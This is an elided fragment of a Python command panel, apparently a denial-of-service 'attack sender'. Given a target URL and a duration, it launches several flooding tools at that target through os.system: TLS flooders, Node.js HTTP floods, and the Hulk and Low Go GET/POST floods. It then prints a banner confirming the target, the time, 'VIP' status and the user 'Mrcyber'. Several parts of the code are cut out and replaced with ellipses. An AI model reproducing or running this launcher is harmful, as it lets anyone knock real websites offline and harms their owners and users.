...
""")
				...
				main()
		elif sinput == "fuck" or sinput == "FUCK":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'./godzilla/tls {url} {time} 300 2')
				os.system(f'node ./godzilla/tlsv2.js {url} {time} 300 2')
				os.system(f'node ./godzilla/HTTP.js {url} 500 1 {time}')
				os.system(f'./randomstring/screetvip {url} {time} 300 5')
				os.system(f'go run ./resources/Hulk.go -site {url} -data GET ')
				os.system(f'go run ./resources/Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mFUCK \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
...
""")
			...
			try:
				...
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && go run Hulk.go -site {url} -data GET && go run Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
